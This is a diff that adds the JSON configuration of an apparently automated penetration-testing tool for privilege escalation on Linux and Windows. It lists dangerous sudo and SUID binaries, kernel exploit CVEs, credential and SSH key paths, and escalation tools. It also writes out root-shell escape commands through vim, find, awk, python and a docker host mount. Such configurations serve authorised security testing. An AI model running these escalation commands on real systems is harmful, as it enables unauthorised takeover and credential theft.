@@ -1,0 +1,189 @@
+{
+  "general_settings": {
+    "max_escalation_attempts": 10,
+    "timeout_per_technique": 120,
+    "run_automated_tools": true,
+    "save_intermediate_results": true
+  },
+  
+  "linux_escalation": {
+    "check_sudo": true,
+    "check_suid": true,
+    "check_cron": true,
+    "check_writable_files": true,
+    "check_capabilities": true,
+    "check_kernel_exploits": true,
+    "check_docker_escape": true,
+    "run_linpeas": true,
+    "check_ssh_keys": true,
+    "check_environment_vars": true
+  },
+  
+  "windows_escalation": {
+    "check_privileges": true,
+    "check_unquoted_services": true,
+    "check_weak_permissions": true,
+    "check_always_install_elevated": true,
+    "check_stored_credentials": true,
+    "check_token_impersonation": true,
+    "check_registry_autologon": true,
+    "run_winpeas": true,
+    "check_scheduled_tasks": true
+  },
+  
+  "dangerous_sudo_binaries": [
+    "vim", "nano", "emacs", "less", "more", "view", "pico",
+    "find", "awk", "sed", "grep", "sort", "uniq", "head", "tail",
+    "python", "python2", "python3", "perl", "ruby", "lua", "node",
+    "bash", "sh", "dash", "zsh", "fish", "csh", "tcsh",
+    "docker", "lxc", "systemctl", "service", "mount", "umount",
+    "cp", "mv", "dd", "tar", "zip", "unzip", "gzip", "gunzip",
+    "wget", "curl", "nc", "netcat", "socat", "ssh", "scp",
+    "git", "make", "gcc", "g++", "ld", "as", "nmap", "tcpdump"
+  ],
+  
+  "dangerous_suid_binaries": [
+    "nmap", "vim", "find", "bash", "more", "less", "nano",
+    "cp", "mv", "awk", "python", "python3", "perl", "ruby",
+    "tar", "zip", "unzip", "socat", "docker", "systemctl",
+    "mount", "umount", "passwd", "su", "sudo", "pkexec"
+  ],
+  
+  "dangerous_windows_privileges": [
+    "SeImpersonatePrivilege",
+    "SeAssignPrimaryTokenPrivilege", 
+    "SeTcbPrivilege",
+    "SeBackupPrivilege",
+    "SeRestorePrivilege",
+    "SeCreateTokenPrivilege",
+    "SeLoadDriverPrivilege",
+    "SeTakeOwnershipPrivilege",
+    "SeDebugPrivilege",
+    "SeManageVolumePrivilege"
+  ],
+  
+  "kernel_exploits": {
+    "linux": [
+      {
+        "name": "DirtyCow",
+        "cve": "CVE-2016-5195",
+        "check_command": "uname -r",
+        "vulnerable_versions": ["2.6.22", "4.8.3"]
+      },
+      {
+        "name": "PwnKit", 
+        "cve": "CVE-2021-4034",
+        "check_command": "pkexec --version",
+        "vulnerable_versions": ["0.105"]
+      },
+      {
+        "name": "Baron Samedit",
+        "cve": "CVE-2021-3156", 
+        "check_command": "sudo --version",
+        "vulnerable_versions": ["1.8.31", "1.9.5"]
+      }
+    ],
+    "windows": [
+      {
+        "name": "MS16-032",
+        "cve": "CVE-2016-0099",
+        "check_command": "systeminfo",
+        "vulnerable_versions": ["Windows 7", "Windows 8.1", "Windows 10"]
+      },
+      {
+        "name": "MS17-010",
+        "cve": "CVE-2017-0144",
+        "check_command": "systeminfo",
+        "vulnerable_versions": ["Windows 7", "Windows 8.1", "Windows 10"]
+      }
+    ]
+  },
+  
+  "file_paths_to_check": {
+    "linux": {
+      "writable_system_files": [
+        "/etc/passwd", "/etc/shadow", "/etc/sudoers", "/etc/crontab",
+        "/etc/systemd/system/", "/etc/init.d/", "/etc/rc.local"
+      ],
+      "interesting_files": [
+        "/home/*/.ssh/", "/root/.ssh/", "/etc/ssh/", "/var/mail/",
+        "/var/spool/cron/", "/tmp/", "/var/tmp/", "/dev/shm/"
+      ],
+      "config_files": [
+        "/etc/my.cnf", "/etc/apache2/", "/etc/nginx/", "/etc/redis/",
+        "/var/www/", "/opt/", "/usr/local/bin/"
+      ]
+    },
+    "windows": {
+      "service_paths": [
+        "C:\\Program Files\\", "C:\\Program Files (x86)\\",
+        "C:\\Windows\\System32\\", "C:\\Windows\\SysWOW64\\"
+      ],
+      "registry_keys": [
+        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+        "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
+      ],
+      "interesting_files": [
+        "C:\\Users\\*\\Desktop\\", "C:\\Users\\*\\Documents\\",
+        "C:\\Windows\\Temp\\", "C:\\Temp\\", "C:\\inetpub\\wwwroot\\"
+      ]
+    }
+  },
+  
+  "escalation_techniques": {
+    "linux": {
+      "sudo_escalation": {
+        "enabled": true,
+        "commands": {
+          "vim": "vim -c ':!/bin/bash'",
+          "find": "find /etc -exec /bin/bash \\;",
+          "awk": "awk 'BEGIN {system(\"/bin/bash\")}'",
+          "python": "python -c 'import os; os.system(\"/bin/bash\")'",
+          "docker": "docker run -v /:/mnt --rm -it alpine chroot /mnt bash"
+        }
+      },
+      "suid_escalation": {
+        "enabled": true,
+        "gtfobins_integration": true
+      },
+      "cron_escalation": {
+        "enabled": true,
+        "check_writable_scripts": true
+      }
+    },
+    "windows": {
+      "token_impersonation": {
+        "enabled": true,
+        "tools": ["PrintSpoofer", "RoguePotato", "JuicyPotato"]
+      },
+      "service_escalation": {
+        "enabled": true,
+        "check_unquoted_paths": true,
+        "check_weak_permissions": true
+      },
+      "registry_escalation": {
+        "enabled": true,
+        "check_autologon": true,
+        "check_always_install_elevated": true
+      }
+    }
+  },
+  
+  "tools_paths": {
+    "linpeas": "/opt/pentest/tools/linpeas.sh",
+    "winpeas": "/opt/pentest/tools/winPEAS.exe",
+    "pspy": "/opt/pentest/tools/pspy64",
+    "linenum": "/opt/pentest/tools/LinEnum.sh",
+    "windows_exploit_suggester": "/opt/pentest/tools/windows-exploit-suggester.py",
+    "printspoofer": "/opt/pentest/tools/PrintSpoofer.exe",
+    "juicypotato": "/opt/pentest/tools/JuicyPotato.exe"
+  },
+  
+  "output_settings": {
+    "save_command_outputs": true,
+    "generate_escalation_report": true,
+    "include_failed_attempts": true,
+    "compress_large_outputs": true
+  }
+}
